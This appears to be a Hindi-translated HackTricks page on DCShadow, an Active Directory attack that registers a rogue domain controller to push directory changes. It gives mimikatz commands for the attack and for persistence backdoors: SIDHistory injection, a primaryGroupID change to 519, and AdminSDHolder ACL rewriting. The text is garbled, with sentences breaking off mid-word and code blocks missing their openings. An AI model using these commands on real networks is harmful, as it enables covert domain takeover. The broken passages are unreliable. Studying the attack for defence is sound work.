<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) और **मुझे** **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** का** **अनुसरण** करें।
* **अपने हैकिंग ट्रिक्स साझा करें, PRs के माध्यम से** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos को सबमिट करके।

</details>


# DCShadow

यह AD में एक **नया डोमेन कंट्रोलर** रजिस्टर करता है और इसका उपयोग करता है **निर्दिष्ट ऑब्ज
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% endcode %}

{% code title="mimikatz2 (push) - DA या समान की आवश्यकता है" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

ध्यान दें कि **`elevate::token`** `mimikatz1` सत्र में काम नहीं करेगा क्योंकि यह धागे की विशेषाधिकारों को उच्च करता है, लेकिन हमें **प्रक्रिया की विशेषाधिकार** को उच्च करने की आवश्यकता है।\
आप एक "LDAP" वस्तु को भी चुन सकते हैं: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

आप DA से या इस न्यूनतम अनुमतियों वाले उपयोगकर्ता से इस तरह से परिवर्तन कर सकते हैं:

* **डोमेन वस्तु** में:
* _DS-Install-Replica_ (डोमेन में रेप्लिका जोड़ें/हटाएं)
* _DS-Replication-Manage-Topology_ (रेप्लिकेशन टोपोलॉजी प्रबंधित करें)
* _DS-Replication-Synchronize_ (रेप्लिकेशन समकालीन)
* **कॉन्फ़िगरेशन कंटेनर** में **साइट्स वस्तु** (और इसके बच्चे):
* _CreateChild और DeleteChild_
* **उस कंप्यूटर की वस्तु** (जो एक DC के रूप में पंजीकृत है):
* _WriteProperty_ (लेखन नहीं)
* **लक्ष्य वस्तु**:
* _WriteProperty_ (लेखन नहीं)

आप [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) का उपयोग करके इन अनुमतियों को एक अनुप्रयोगी उपयोगकर्ता को दे सकते हैं (ध्यान दें कि इससे कुछ लॉग छोड़ जाएंगे)। यह DA अनुमतियों की तुलना में काफी प्रतिबंधक है।\
उदाहरण के लिए: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` इसका मतलब है कि जब यूजरनेम _**student1**_ मशीन _**mcorp-student1**_ में लॉग ऑन होता है तो उसके पास DCShadow अनुमतियाँ _**root1user**_ वस्तु पर होती हैं।

## बैकडोर बनाने के लिए DCShadow का उपयोग
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% endcode %}

{% code title="चेज प्राइमरीग्रुपआईडी (उपयोगकर्ता को डोमेन व्यवस्थापकों के सदस्य के रूप में डालें)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% endcode %}

{% code title="AdminSDHolder के ntSecurityDescriptor को संशोधित करें (किसी उपयोगकर्ता को पूर्ण नियंत्रण दें)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## शैडोसेप्शन - DCShadow का उपयोग करके DCShadow अनुमतियाँ देना (संशोधित अनुमतियों के लॉग नहीं)

हमें निम्नलिखित ACEs को हमारे उपयोगकर्ता के SID के साथ जोड़ना होगा:

* डोमेन ऑब्ज
